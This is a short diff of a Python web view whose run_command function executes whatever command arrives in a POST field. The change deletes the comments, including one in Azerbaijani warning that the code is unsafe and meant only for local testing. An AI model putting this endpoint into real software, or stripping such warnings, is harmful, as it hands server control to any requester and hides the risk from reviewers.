@@ -50,9 +50,8 @@ def get_client_ip(request):
 
 def run_command(request):
     if request.method == "POST":
-        cmd = request.POST.get("cmd")  # formdan əmri al
+        cmd = request.POST.get("cmd")
         try:
-            # WARNING: təhlükəsiz deyil, yalnız lokal test üçündür
             result = subprocess.run(cmd.split(), capture_output=True, text=True)
             output = result.stdout
         except Exception as e:
